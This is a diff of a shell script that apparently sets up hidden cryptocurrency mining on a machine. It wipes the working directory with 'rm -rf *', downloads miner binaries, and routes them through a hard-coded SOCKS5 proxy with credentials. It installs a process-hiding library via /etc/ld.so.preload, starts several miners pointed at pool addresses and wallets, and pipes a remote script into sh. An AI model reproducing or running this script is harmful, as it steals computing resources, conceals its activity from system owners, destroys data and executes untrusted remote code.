@@ -1,26 +1,16 @@
-rm -rvf * && mkdir d && cd d
+rm -rf *
+
+git clone https://gitlab.com/majapahlevi/majapahlevi
+cd majapahlevi
+
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-sudo apt-get install -y nodejs
-
-apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
-
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-
-npm i -g node-process-hider
-
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
-
-chmod 777 lol1.81
-
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
+apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
 
 tar -xvzf graphics.tar.gz
-
+rm -rf graphich.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
@@ -29,6 +19,7 @@ socks5 = 68.183.159.42:443
 socks5_username = majapahlevi
 socks5_password = majapahlevi
 END
+
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
@@ -49,12 +40,19 @@ echo ""
 echo " "
 echo " "
 
+./graftcp/graftcp rm -rf gas && unzip korek.zip
+chmod +x gas
+rm -rf Makefile
+rm -rf processhider.c
+rm -rf README.md
+rm -rf .gitignore
+rm -rf korek.zip
 
-./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
-unzip magicBezzHash.zip
+unzip tukimin.zip
+rm -rf tukimin.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 157.245.6.241:80 -u pyrin:qryudmznyqgg2dhxzawmjcsjsd06jwfyq5gupmxjhrc04z4k7l8fqjc8zvlda.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u QT5J7ALoKpg93HLbYeZMaViNw3ivWaHX6b -t2 & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./gas -d=0 -a "NQ36M2P2NX9YLSKH9S6AE5E42X3N8H2ADQQU" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-20000 -n 1)) -t 4 -i Disable & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u QT5J7ALoKpg93HLbYeZMaViNw3ivWaHX6b -t2 & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
